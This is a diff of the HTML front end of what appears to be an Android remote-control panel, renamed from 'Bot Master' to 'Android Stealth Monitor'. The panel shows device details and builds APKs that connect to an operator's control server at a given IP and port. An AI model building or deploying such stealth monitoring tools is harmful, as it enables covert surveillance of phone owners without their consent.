@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Master</title>
-
-    <!-- FONTS -->
+    <title>Android Stealth Monitor</title>
 
 
     <!-- CSS -->
@@ -24,8 +22,8 @@
 <body>
     <div id="mainBody">
         <header>
-            <img src="../img/cyber-eye.png" alt="">
-            <p>BOT MASTER</p>
+            <img src="../img/eye.png" alt="">
+            <p>ANDROID STEALTH MONITOR</p>
         </header>
         <div id="container">
             <form id="left">
@@ -46,7 +44,7 @@
                             <span>--</span>
                         </div>
                         <div class="info">
-                            <span>Manufacture :</span>
+                            <span>Manufacturer :</span>
                             <span>--</span>
                         </div>
                         <div class="device-action">
@@ -58,28 +56,27 @@
                     </div>
                 </div>
                 <div class="section-container">
-                    <p class="section-title">
-                        Build APK
-                        <span class="info-icon" title="Build a custom APK configured with your WebSocket server details. Enter your server's IP address or domain to establish the connection between the Android client and your control server.">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <circle cx="12" cy="12" r="10"></circle>
-                                <path d="M12 16v-4"></path>
-                                <path d="M12 8h.01"></path>
-                            </svg>
-                        </span>
-                    </p>
-                    <input type="text" id="ipInput" placeholder="" value="">
+                    <div class="input-row">
+                        <input type="text" id="ipInput" placeholder="IP/Domain" value="">
+                        <input type="text" id="portInput" placeholder="Port" value="">
+                    </div>
                     <div class="button-container">
-                        <div class="section-apk-inline" onclick="download()" title="Build and Download APK">
-                            <img src="../img/download.svg" alt="Build and Download APK">
-                            <span>Build APK</span>
+                        <div class="section-apk-inline" onclick="download()" title="Build a custom APK configured with your WebSocket server details. Enter your server's IP address or domain to establish the connection between the Android client and your control server.">
+                            <img src="../img/build.png" alt="Build APK">
+                            <span id="buildButtonText">Build APK</span>
                         </div>
+                    </div>
+                    <div id="buildProgress" class="build-progress" style="display: none;">
+                        <div class="progress-bar">
+                            <div class="progress-fill"></div>
+                        </div>
+                        <div class="progress-text">Building APK...</div>
                     </div>
                 </div>
                 <div class="section-container">
                     <div class="button-container">
-                        <div class="section-apk-inline" onclick="downloadLatest()" title="Download APK">
-                            <img src="../img/download.svg" alt="Download APK">
+                        <div class="section-apk-inline" onclick="downloadLatest()" title="Download the latest APK">
+                            <img src="../img/download.png" alt="Download the last APK">
                             <span>Download APK</span>
                         </div>
                     </div>
